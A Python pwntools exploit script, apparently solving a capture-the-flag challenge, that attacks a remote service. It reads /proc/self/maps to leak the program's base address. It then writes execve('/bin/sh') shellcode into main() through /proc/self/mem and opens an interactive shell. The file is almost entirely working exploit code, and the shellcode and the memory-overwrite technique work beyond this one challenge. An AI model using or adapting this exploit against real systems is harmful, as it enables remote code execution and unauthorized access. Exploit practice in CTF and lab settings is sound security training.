import argparse

from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'DEBUG'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
#r = process('./challenge/build/challenge')
# r = gdb.debug('./challenge/build/challenge')

def menu(r, choice):
    r.recvline_contains(b'What do you want to do?')
    r.recvuntil(b'> ')
    r.sendline(str(choice).encode())


shellcode = b'\x90' * 0x101 + b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05' #+ 0x500*b'\x90'

menu(r, 1)
r.sendline(b"/proc/self/maps")
r.sendline(b"r")


menu(r, 4)
r.sendline(b"0")
r.recvuntil(b"How much do you want to read? ")
r.sendline(b"400")

maps = r.recv(400)

#conts = r.recvuntil(b"What do you want to do?")

base = int(maps.split(b"\n")[0].split(b'-')[0], 16)

log.info('.text base: %x', base)
main_addr = base + 0x18ec
log.info('main() addr: %x', main_addr)

menu(r, 1)
r.sendline(b"/proc/self/mem")
r.sendline(b"rw")

menu(r, 3)
r.sendline(f"{main_addr:x}".encode())
r.sendline(f"{len(shellcode):x}".encode())
r.send(shellcode)


r.interactive()



